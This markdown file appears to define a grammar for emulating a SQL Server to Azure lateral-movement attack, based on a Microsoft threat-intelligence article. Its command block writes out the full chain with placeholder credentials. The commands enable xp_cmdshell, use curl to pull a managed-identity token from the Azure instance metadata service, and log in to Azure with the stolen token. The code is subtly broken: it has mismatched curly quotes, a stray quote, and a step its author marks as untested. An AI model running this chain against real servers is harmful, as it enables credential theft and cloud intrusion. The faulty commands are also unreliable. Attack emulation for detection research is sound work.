# Simple CFG For SQL Lateral Movement
Based on article:
[Defending new vectors: Threat actors attempt SQL Server to cloud lateral movement _By Microsoft Threat Intelligence_](https://www.microsoft.com/en-us/security/blog/2023/10/03/defending-new-vectors-threat-actors-attempt-sql-server-to-cloud-lateral-movement/)

### Commands (terminals)
```
c1 = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password "<password>" -Query "EXEC master..sp_configure ‘SHOW advanced options’,1; “RECONFIGURE WITH OVERRIDE;"
c2 = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password "<password>" -Query "EXEC master..sp_configure ‘xp_cmdshell’, 1; RECONFIGURE WITH OVERRIDE;"
c3 = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password "<password>" -Query "EXEC master..sp_configure ‘SHOW advanced options’,0; RECONFIGURE WITH OVERRIDE;"
c4 = $accessToken = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password "<password>" -Query "EXEC xp_cmdshell 'curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"'" | Select-String -Pattern '^{.*}' | ForEach-Object { $tokenObject = ConvertFrom-Json $_.Matches[0].Value; $tokenObject.access_token }
c5 = az login -u <sqlserver> -p $accessToken --service-principal
```

[//]: # (^ not sure if c5 is correct, please test)

### Activities (non-terminals)
```
A = c1 c2 c3 c4 c5
```

### Starting Production Rule
```
S -> A
```